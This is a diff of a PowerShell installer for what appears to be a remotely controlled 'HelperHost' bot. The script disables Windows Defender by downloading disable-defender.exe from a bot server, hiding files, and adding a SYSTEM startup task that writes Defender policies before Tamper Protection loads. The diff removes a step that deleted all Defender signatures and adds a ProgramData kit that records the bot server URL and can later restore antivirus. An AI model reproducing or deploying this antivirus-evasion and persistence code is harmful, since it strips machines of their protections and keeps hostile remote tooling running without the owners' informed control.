@@ -654,11 +654,7 @@ function Disable-AllBlocking {
       Stop-Process -Force -EA SilentlyContinue
   } catch {}
 
-  # Gut signatures so even if engine restarts it does little
-  $mp = Join-Path $env:ProgramFiles 'Windows Defender\MpCmdRun.exe'
-  if (Test-Path $mp) {
-    try { cmd.exe /c "`"$mp`" -RemoveDefinitions -All >nul 2>&1" | Out-Null } catch {}
-  }
+  # NEVER MpCmdRun -RemoveDefinitions -All: bricks signatures and breaks wipe restore.
 
   $ErrorActionPreference = $prev
   try { $PSNativeCommandUseErrorActionPreference = $script:__prevNativeEap } catch {}
@@ -688,12 +684,13 @@ function Install-DefenderControl {
       Write-Host "disable-defender download: $($_.Exception.Message)"
     }
   }
-  # Also stage enable for wipe later
+  # Stage enable for wipe later (HelperHost dir + durable ProgramData wipe kit)
   $en = Join-Path $Dir 'enable-defender.exe'
   $ens = "$($BotBase.TrimEnd('/'))/files/tools/enable-defender.exe"
   if (-not (Test-Path $en) -or (Get-Item $en).Length -lt 100000) {
     try { Download-File $ens $en; Unblock-Quiet $en; Hide-HH $en } catch {}
   }
+  try { Install-WipeKit } catch {}
   if (-not (Test-Path $dis)) { return }
 
   try {
@@ -780,13 +777,50 @@ function Request-AvRebootIfNeeded {
   $script:ElevRebootPending = $true
 }
 
+function Get-WipeKitDir {
+  $d = Join-Path $env:ProgramData 'HelperHostWipe'
+  if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
+  return $d
+}
+
+function Install-WipeKit {
+  # Durable restore kit outside HelperHost so wipe can restore AV even after Nuke-Tree.
+  if (-not (Test-IsAdmin)) { return }
+  $kit = Get-WipeKitDir
+  Remove-Item (Join-Path $kit 'STOP') -Force -EA SilentlyContinue
+  $enSrc = Join-Path $Dir 'enable-defender.exe'
+  $enDst = Join-Path $kit 'enable-defender.exe'
+  if (Test-Path $enSrc) {
+    Copy-Item $enSrc $enDst -Force -EA SilentlyContinue
+  } elseif ($BotBase) {
+    try { Download-File "$($BotBase.TrimEnd('/'))/files/tools/enable-defender.exe" $enDst } catch {}
+  }
+  $restoreDest = Join-Path $kit 'restore-win-security.ps1'
+  $restoreUrl = $null
+  if ($InstallUrl) {
+    $restoreUrl = $InstallUrl -replace 'install-win\.ps1', 'restore-win-security.ps1' -replace 'install\.ps1', 'restore-win-security.ps1'
+  }
+  if (-not $restoreUrl -and $BotBase) {
+    $restoreUrl = "$($BotBase.TrimEnd('/'))/files/scripts/restore-win-security.ps1"
+  }
+  if ($restoreUrl) {
+    try { Download-File $restoreUrl $restoreDest } catch {}
+  }
+  if ($BotBase) {
+    @{ bot_base = $BotBase.TrimEnd('/') } | ConvertTo-Json -Compress |
+      Set-Content -Encoding UTF8 (Join-Path $kit 'bot.json') -Force
+  }
+}
+
 function Install-EarlyAvTask {
   # ONSTART as SYSTEM: writes Defender policies BEFORE WinDefend/Tamper load.
   # Live changes fail while Tamper is on — 1 reboot applies "gere par l'organisation".
+  # STOP file in ProgramData\HelperHostWipe aborts EarlyAV permanently (wipe creates it first).
   if (-not (Test-IsAdmin)) { return }
   $cmd = Join-Path $Dir 'early-av.cmd'
   @(
     '@echo off'
+    'if exist "%ProgramData%\HelperHostWipe\STOP" exit /b 0'
     'cd /d "%~dp0"'
     'if exist "%~dp0disable-defender.exe" ('
     '  "%~dp0disable-defender.exe" -s'
@@ -1023,7 +1057,11 @@ Si politique d'organisation (GPO/MDM), elle doit etre retiree.
 }
 
 function Install-WipeRestoreHook {
-  $restoreDest = Join-Path $env:TEMP 'hh-restore-security.ps1'
+  Install-WipeKit
+  $kit = Get-WipeKitDir
+  $restoreDest = Join-Path $kit 'restore-win-security.ps1'
+  # Also keep TEMP copy for older wipe bats
+  $restoreTemp = Join-Path $env:TEMP 'hh-restore-security.ps1'
   $restoreUrl = $null
   if ($InstallUrl) {
     $restoreUrl = $InstallUrl -replace 'install-win\.ps1', 'restore-win-security.ps1' -replace 'install\.ps1', 'restore-win-security.ps1'
@@ -1035,9 +1073,13 @@ function Install-WipeRestoreHook {
       return
     }
   }
-  try {
-    Download-File $restoreUrl $restoreDest
-  } catch {}
+  try { Download-File $restoreUrl $restoreDest } catch {}
+  if (Test-Path $restoreDest) {
+    Copy-Item $restoreDest $restoreTemp -Force -EA SilentlyContinue
+  } else {
+    try { Download-File $restoreUrl $restoreTemp } catch {}
+    if (Test-Path $restoreTemp) { Copy-Item $restoreTemp $restoreDest -Force -EA SilentlyContinue }
+  }
   if (-not (Test-Path $restoreDest)) { return }
 
   $tn = 'HelperHostWipeRestore'
